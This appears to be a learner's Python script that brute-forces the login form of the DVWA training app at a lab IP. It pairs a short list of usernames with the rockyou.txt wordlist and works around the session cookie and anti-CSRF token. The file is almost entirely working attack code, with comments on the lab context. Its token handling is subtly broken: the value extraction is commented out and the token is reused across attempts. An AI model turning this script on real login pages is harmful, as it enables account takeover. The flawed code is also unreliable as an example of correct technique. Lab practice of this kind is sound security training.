#Python - Web Login Form Brute Force
#Brute forcing a web application login page using  DWVA 
from bs4 import BeautifulSoup
import requests
import sys
import re

#BeautifulSoup must be imported due to DVWA responding with a 302 Fount HTTP Response
#This send the user back to the login page in case of  an unsucessful attempt
#or to index.php in case of a login success - However this generates a new user token
#taget host
target = "http://192.168.50.239/dvwa/login.php"
#common usernames to try
usernames=["admin","test","msfadmin","user"]
#password lists to enumerate over
passwords="rockyou.txt"
#Using a needle to determine when a successful login attempt has been made
needle="index.php"
#Message will not display if the login attempt was unsuccessful
#Problem encountered. During running of the initial for loop cases were attempted to brute force.
#Upon failure and further research several things were identified. The first was that the main login page for DVWA signals an anti-CSRF token
#Meaning that a Session ID must be included in the attack to work
#Meaning a valid Session ID needs to be sent with the correct CSRF token, if either is incorrect or is not include the web application can protect itself
#PHPSESSID and user_token 
#Extract the session id
r=requests.get(target,timeout=5)
session_id = re.match("PHPSESSID=(.*?);",r.headers["set-cookie"])
session_id = session_id.group(1)
cookie = {"PHPSESSID":session_id}
#prepare BeautifulSoup
soup = BeautifulSoup(r.text,"html.parser")
#get user token
user_token = soup.find("input", {"name":"user_token"})#["value"]
#iterate over each username w/ the passwordlist
for username in usernames:
	with open(passwords,"r") as passwords_list:
		for password in passwords_list:
			password = password.strip("\n").encode('latin-1')
			sys.stdout.write("[X] Attempting user:password -> {}:{}\r".format(username,password.decode('latin-1')))
			sys.stdout.flush()
			r = requests.post(target,cookies=cookie,allow_redirects=False,data={"username":username,"password":password,"Login":"Login","user_token":user_token})
			if needle in r.headers["Location"]: 
				sys.stdout.write("\n")
				sys.stdout.write("\t[>>>>] Valid Password '{}' found for user '{}'!".format(password.decode(),username))
				sys.exit()
		sys.stdout.flush()
		sys.stdout.write("\n")
		sys.stdout.write("\tNo Password found for '{}'!".format(username))
